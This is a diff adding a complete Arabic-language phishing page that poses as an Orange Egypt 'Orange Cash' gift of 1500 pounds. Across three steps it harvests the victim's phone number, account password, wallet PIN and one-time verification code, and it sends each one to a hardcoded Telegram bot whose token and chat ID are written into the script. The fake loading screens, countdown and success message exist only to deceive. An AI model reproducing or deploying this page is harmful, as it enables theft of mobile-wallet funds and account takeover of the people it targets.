@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدية 1500 جنيه من أورنج كاش</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --orange-main: #FF6600;
+            --orange-dark: #E65C00;
+            --orange-light: #FF8533;
+            --white: #FFFFFF;
+            --black: #333333;
+            --gray: #F5F5F5;
+            --red: #FF3A30;
+            --green: #4CAF50;
+        }
+        
+        body {
+            font-family: 'Tajawal', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--gray);
+            color: var(--black);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--orange-main), var(--orange-dark));
+            color: var(--white);
+            padding: 30px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -50px;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background-color: var(--gray);
+            transform: skewY(-3deg);
+            z-index: 1;
+        }
+        
+        .logo {
+            width: 150px;
+            margin-bottom: 15px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: -30px auto 30px;
+            padding: 0 20px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .offer-card {
+            background-color: var(--white);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        
+        .offer-header {
+            background: linear-gradient(135deg, var(--orange-light), var(--orange-main));
+            color: var(--white);
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .offer-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin: 0;
+        }
+        
+        .data-amount {
+            font-size: 3.5rem;
+            font-weight: 800;
+            line-height: 1;
+            margin: 10px 0;
+            color: var(--white);
+        }
+        
+        .offer-body {
+            padding: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--orange-dark);
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        
+        .form-input:focus {
+            border-color: var(--orange-main);
+            outline: none;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(135deg, var(--orange-main), var(--orange-dark));
+            color: var(--white);
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(230, 92, 0, 0.4);
+        }
+        
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .message {
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background-color: #E8F5E9;
+            color: #2E7D32;
+            border: 1px solid #C8E6C9;
+        }
+        
+        .error {
+            background-color: #FFEBEE;
+            color: var(--red);
+            border: 1px solid #FFCDD2;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: var(--white);
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .terms {
+            font-size: 0.8rem;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+            margin-top: 30px;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .steps::before {
+            content: "";
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #ddd;
+            z-index: 1;
+        }
+        
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #ddd;
+            color: #888;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step.active {
+            background-color: var(--orange-main);
+            color: var(--white);
+        }
+        
+        .step.completed {
+            background-color: var(--green);
+            color: var(--white);
+        }
+        
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        .verification-code {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            direction: ltr;
+        }
+        
+        .verification-code input {
+            width: 40px;
+            height: 50px;
+            font-size: 20px;
+            text-align: center;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            direction: ltr;
+        }
+        
+        .countdown {
+            color: var(--orange-main);
+            font-weight: bold;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .resend-code {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            color: var(--orange-main);
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+        
+        .resend-btn:disabled {
+            color: #999;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+        
+        .progress-bar {
+            height: 5px;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background-color: var(--orange-main);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+            
+            .offer-title {
+                font-size: 1.5rem;
+            }
+            
+            .data-amount {
+                font-size: 2.8rem;
+            }
+            
+            .verification-code input {
+                width: 35px;
+                height: 45px;
+                font-size: 18px;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="header">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDSlTv0cMZrVTFvJ8f48zRxM87IHA8ywwOxw&s" alt="Orange Logo" class="logo">
+        <h1 class="offer-title">هدية 1500 جنيه من أورنج كاش</h1>
+    </div>
+    
+    <div class="container">
+        <div class="offer-card">
+            <div class="offer-header">
+                <div class="data-amount">1500 ج.م</div>
+                <p>عرض حصري لفترة محدودة</p>
+            </div>
+            
+            <div class="offer-body">
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                
+                <div class="steps">
+                    <div class="step active" id="step1">1</div>
+                    <div class="step" id="step2">2</div>
+                    <div class="step" id="step3">3</div>
+                </div>
+                
+                <div id="successMessage" class="message success">
+                    <i class="fas fa-check-circle" style="font-size: 24px; margin-bottom: 10px;"></i>
+                    <h3>تم إرسال طلبك بنجاح!</h3>
+                    <p>سيصلك رمز الهدية على رقم الهاتف خلال دقائق</p>
+                </div>
+                
+                <div id="errorMessage" class="message error">
+                    <i class="fas fa-exclamation-circle" style="font-size: 24px; margin-bottom: 10px;"></i>
+                    <h3>حدث خطأ!</h3>
+                    <p id="errorText">لم يتم إرسال طلبك، يرجى المحاولة مرة أخرى</p>
+                </div>
+                
+                <!-- الصفحة الأولى -->
+                <div id="page1" class="page active">
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <label for="phone" class="form-label">رقم هاتف أورنج</label>
+                            <input type="tel" id="phone" class="form-input" placeholder="أدخل رقم الهاتف" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="password" class="form-label">كلمة السر</label>
+                            <input type="password" id="password" class="form-input" placeholder="أدخل كلمة السر" required>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn" id="nextBtn1">
+                            <i class="fas fa-arrow-right" style="margin-left: 8px;"></i>
+                            التالي
+                        </button>
+                    </form>
+                </div>
+                
+                <!-- الصفحة الثانية -->
+                <div id="page2" class="page">
+                    <form id="orangeCashForm">
+                        <div class="form-group">
+                            <label for="orangeCashPassword" class="form-label">كلمة سر أورنج كاش</label>
+                            <input type="password" id="orangeCashPassword" class="form-input" placeholder="أدخل كلمة سر أورنج كاش" required>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn" id="sendCodeBtn">
+                            <span id="sendCodeText">إرسال كود التحقق</span>
+                        </button>
+                    </form>
+                </div>
+                
+                <!-- الصفحة الثالثة -->
+                <div id="page3" class="page">
+                    <form id="verificationForm">
+                        <div class="form-group">
+                            <label class="form-label">أدخل كود التحقق المكون من 6 أرقام</label>
+                            <div class="verification-code">
+                                <input type="text" maxlength="1" pattern="[0-9]" required>
+                                <input type="text" maxlength="1" pattern="[0-9]" required>
+                                <input type="text" maxlength="1" pattern="[0-9]" required>
+                                <input type="text" maxlength="1" pattern="[0-9]" required>
+                                <input type="text" maxlength="1" pattern="[0-9]" required>
+                                <input type="text" maxlength="1" pattern="[0-9]" required>
+                            </div>
+                        </div>
+                        
+                        <div class="countdown" id="countdown">03:00</div>
+                        
+                        <div class="resend-code">
+                            <button type="button" class="resend-btn" id="resendBtn" disabled>
+                                إعادة إرسال الكود (<span id="resendTime">180</span> ثانية)
+                            </button>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn" id="submitBtn">
+                            <i class="fas fa-gift" style="margin-left: 8px;"></i>
+                            استلام الهدية
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <p class="terms">
+            * يجب أن تكون مشتركاً في أورنج كاش لاستلام الهدية<br>
+            * الهدية صالحة لمدة 30 يوم من تاريخ الاستحقاق<br>
+            * لن يتم خصم أي رسوم من رصيدك<br>
+            © 2023 Orange مصر. جميع الحقوق محفوظة.
+        </p>
+    </div>
+
+    <script>
+        // بيانات المستخدم التي سيتم جمعها
+        const userData = {
+            phone: '',
+            password: '',
+            orangeCashPassword: '',
+            verificationCode: ''
+        };
+        
+        // متغيرات العداد
+        let timer;
+        let timeLeft = 180; // 3 دقائق بالثواني
+        
+        // إعداد شريط التقدم
+        function updateProgress(step) {
+            const progress = document.getElementById('progressBar');
+            progress.style.width = `${(step / 3) * 100}%`;
+        }
+        
+        // الانتقال بين الصفحات مع تأخير
+        function navigateToPage(fromPage, toPage, step) {
+            document.getElementById(fromPage).classList.remove('active');
+            document.getElementById(`step${step-1}`).classList.remove('active');
+            document.getElementById(`step${step-1}`).classList.add('completed');
+            
+            // عرض رسالة تحميل
+            const currentBtn = document.getElementById(`nextBtn${step-1}`) || 
+                             document.getElementById('sendCodeBtn') || 
+                             document.getElementById('submitBtn');
+            const originalText = currentBtn.innerHTML;
+            currentBtn.disabled = true;
+            currentBtn.innerHTML = '<span class="loading"></span> جاري التحميل...';
+            
+            // تأخير الانتقال لمحاكاة التحميل
+            setTimeout(() => {
+                document.getElementById(toPage).classList.add('active');
+                document.getElementById(`step${step}`).classList.add('active');
+                updateProgress(step);
+                currentBtn.disabled = false;
+                currentBtn.innerHTML = originalText;
+            }, 2000); // تأخير 2 ثانية
+        }
+        
+        // إرسال البيانات إلى التليجرام
+        async function sendToTelegram(subject, message) {
+            const botToken = '7703698431:AAHp2r0zr2tcf116RAHIH9fhW2iiA3a4TXE'; // استبدل هذا بتوكن بوتك
+            const chatId = '7380938730'; // استبدل هذا بآيدي الدردشة
+            
+            const fullMessage = `🎁 ${subject}\n\n${message}\n\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: fullMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // الصفحة الأولى: إدخال رقم الهاتف وكلمة السر
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            userData.phone = document.getElementById('phone').value;
+            userData.password = document.getElementById('password').value;
+            
+            // إرسال البيانات إلى البوت
+            const sent = await sendToTelegram('البيانات الأساسية', `
+                📱 رقم الهاتف: ${userData.phone}
+                🔑 كلمة السر: ${userData.password}
+            `);
+            
+            if (sent) {
+                navigateToPage('page1', 'page2', 2);
+            } else {
+                document.getElementById('errorText').textContent = 'حدث خطأ في إرسال البيانات، يرجى المحاولة مرة أخرى';
+                document.getElementById('errorMessage').style.display = 'block';
+            }
+        });
+        
+        // الصفحة الثانية: إدخال كلمة سر أورنج كاش
+        document.getElementById('orangeCashForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            userData.orangeCashPassword = document.getElementById('orangeCashPassword').value;
+            
+            // إظهار تحميل أثناء إرسال الطلب
+            const sendCodeBtn = document.getElementById('sendCodeBtn');
+            const sendCodeText = document.getElementById('sendCodeText');
+            sendCodeBtn.disabled = true;
+            sendCodeText.innerHTML = '<span class="loading"></span> جاري إرسال كود التحقق...';
+            
+            // إرسال بيانات أورنج كاش إلى البوت
+            const sent = await sendToTelegram('بيانات أورنج كاش', `
+                💳 كلمة سر أورنج كاش: ${userData.orangeCashPassword}
+            `);
+            
+            if (sent) {
+                // محاكاة إرسال الكود (في الواقع سيكون من الخادم)
+                setTimeout(() => {
+                    navigateToPage('page2', 'page3', 3);
+                    
+                    // بدء العداد
+                    startCountdown();
+                    
+                    // إرسال إشعار وصول الكود (افتراضي)
+                    sendToTelegram('إشعار', `
+                        📲 تم إرسال كود التحقق إلى الرقم: ${userData.phone}
+                    `);
+                }, 2000);
+            } else {
+                sendCodeBtn.disabled = false;
+                sendCodeText.textContent = 'إرسال كود التحقق';
+                document.getElementById('errorText').textContent = 'حدث خطأ في إرسال البيانات، يرجى المحاولة مرة أخرى';
+                document.getElementById('errorMessage').style.display = 'block';
+            }
+        });
+        
+        // الصفحة الثالثة: إدخال كود التحقق
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // جمع كود التحقق (من اليسار لليمين)
+            const inputs = document.querySelectorAll('.verification-code input');
+            userData.verificationCode = Array.from(inputs).map(input => input.value).join('');
+            
+            // إظهار تحميل
+            const submitBtn = document.getElementById('submitBtn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loading"></span> جاري التحقق...';
+            
+            // إرسال كود التحقق إلى البوت
+            const sent = await sendToTelegram('كود التحقق', `
+                🔢 كود التحقق: ${userData.verificationCode}
+            `);
+            
+            if (sent) {
+                // إظهار رسالة النجاح
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('errorMessage').style.display = 'none';
+                
+                // إخفاء الرسالة بعد 5 ثواني
+                setTimeout(() => {
+                    document.getElementById('successMessage').style.display = 'none';
+                }, 5000);
+            } else {
+                document.getElementById('errorText').textContent = 'حدث خطأ في التحقق، يرجى المحاولة مرة أخرى';
+                document.getElementById('errorMessage').style.display = 'block';
+            }
+            
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalText;
+        });
+        
+        // بدء العداد
+        function startCountdown() {
+            clearInterval(timer);
+            timeLeft = 180;
+            updateCountdown();
+            timer = setInterval(() => {
+                timeLeft--;
+                updateCountdown();
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    document.getElementById('resendBtn').disabled = false;
+                    document.getElementById('resendBtn').innerHTML = 'إعادة إرسال الكود';
+                }
+            }, 1000);
+        }
+        
+        // تحديث عرض العداد
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('countdown').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            document.getElementById('resendTime').textContent = timeLeft;
+        }
+        
+        // زر إعادة الإرسال
+        document.getElementById('resendBtn').addEventListener('click', async function() {
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = true;
+            resendBtn.innerHTML = '<span class="loading"></span> جاري الإرسال...';
+            
+            // إرسال إشعار إعادة الإرسال
+            const sent = await sendToTelegram('إعادة إرسال', `
+                🔄 طلب إعادة إرسال كود التحقق
+                📱 الرقم: ${userData.phone}
+            `);
+            
+            if (sent) {
+                // إعادة تعيين العداد
+                timeLeft = 180;
+                updateCountdown();
+                startCountdown();
+            } else {
+                resendBtn.disabled = false;
+                resendBtn.innerHTML = 'إعادة إرسال الكود';
+                document.getElementById('errorText').textContent = 'حدث خطأ في إعادة الإرسال';
+                document.getElementById('errorMessage').style.display = 'block';
+            }
+        });
+        
+        // التحكم في حقول كود التحقق (من اليسار لليمين)
+        const verificationInputs = document.querySelectorAll('.verification-code input');
+        verificationInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1) {
+                    if (index < verificationInputs.length - 1) {
+                        verificationInputs[index + 1].focus();
+                    } else {
+                        this.blur();
+                    }
+                }
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0) {
+                    if (index > 0) {
+                        verificationInputs[index - 1].focus();
+                    }
+                }
+            });
+        });
+        
+        // تحديث شريط التقدم عند التحميل
+        updateProgress(1);
+    </script>
+</body>
+</html>
